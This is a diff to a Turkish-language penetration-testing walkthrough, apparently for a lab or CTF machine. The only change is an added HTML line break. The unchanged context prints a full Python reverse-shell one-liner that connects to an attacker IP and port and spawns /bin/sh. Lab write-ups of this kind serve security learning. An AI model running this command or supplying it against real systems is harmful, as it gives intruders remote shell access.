@@ -95,6 +95,7 @@ Giriş yapıldıktan sonra açılan ekranda komut paneli ile karşılaşıldı. 
 Makinede Python olup olmadığı kontrol edildikten sonra Python ile komut çalıştırma denediğinde pythonın kullanabildiği görüldü. Reverse Shell almak için PentestMonkey den python ile çalıştırılan reverse Shell komutu alınıp atak makinesinin IP si ile düzenlenerek komut çalıştırıldı. 
 
 ``` locate python ```
+<br>
 ``` python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<Makine IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ```
 <br>
     <div style="text-align:center;">
